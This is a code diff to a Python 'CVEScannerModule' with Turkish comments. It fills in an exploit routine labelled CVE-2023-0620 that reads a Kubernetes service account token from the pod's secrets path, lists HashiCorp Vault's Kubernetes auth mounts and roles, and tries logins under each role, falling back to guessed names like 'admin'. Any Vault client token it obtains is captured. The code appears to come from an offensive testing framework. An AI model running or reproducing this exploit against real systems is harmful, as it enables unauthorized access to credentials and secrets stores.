@@ -272,11 +272,51 @@ class CVEScannerModule(BaseExecutionModule):
     # ─── EXPLOIT FONKSİYONLARI ─────────────────────────────────────────────
 
     def _exploit_cve_2023_0620(self, target, token, context):
-        """CVE-2023-0620 - Kubernetes auth bypass"""
-        return {
-            "success": False,
-            "error": "CVE-2023-0620 exploit implementation pending",
-        }
+        """CVE-2023-0620 - Kubernetes auth bypass (unauthorized token)."""
+        try:
+            jwt_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
+            if os.path.exists(jwt_path):
+                with open(jwt_path, "r", encoding="utf-8") as f:
+                    jwt = f.read().strip()
+            else:
+                jwt = ""
+            if not jwt:
+                return {"success": False, "error": "K8s JWT token bulunamadı"}
+
+            headers = {"X-Vault-Token": token} if token else {}
+            url = f"{target}/v1/sys/mounts"
+            resp = vault_request("GET", url, headers=headers, timeout=5)
+            if resp.status_code != 200:
+                return {"success": False, "error": "Mount'lar listelenemedi"}
+            mounts = resp.json().get("data", {})
+            k8s_mounts = [p for p, i in mounts.items() if i.get("type") == "kubernetes"]
+            if not k8s_mounts:
+                return {"success": False, "error": "Kubernetes mount bulunamadı"}
+
+            for role in self._list_k8s_roles(target, headers, k8s_mounts[0]):
+                login_url = f"{target}/v1/auth/{k8s_mounts[0].strip('/')}/login"
+                payload = {"jwt": jwt, "role": role}
+                resp = vault_request("POST", login_url, json=payload, timeout=5)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    new_token = data.get("auth", {}).get("client_token")
+                    if new_token:
+                        context.captured_token = new_token
+                        return {"success": True, "token": new_token[:8] + "...", "role": role}
+            return {"success": False, "error": "Login başarısız (tüm roller denendi)"}
+        except Exception as e:
+            return {"success": False, "error": str(e)}
+
+    def _list_k8s_roles(self, target, headers, mount_path):
+        """K8s auth rollerini listele; LIST denied ise yaygın adlara düş."""
+        url = f"{target}/v1/auth/{mount_path.strip('/')}/role"
+        resp = vault_request("LIST", url, headers=headers, timeout=5)
+        if resp.status_code == 200:
+            data = resp.json().get("data", {})
+            roles = [str(k).rstrip("/") for k in data.get("keys", []) if isinstance(k, str)]
+            if roles:
+                return roles
+        return ["default", "admin", "dev", "vault", "k8s", "kubernetes"]
 
     def _exploit_cve_2023_46835(self, target, token, context):
         """CVE-2023-46835 - Kubernetes Service Account validation bypass"""
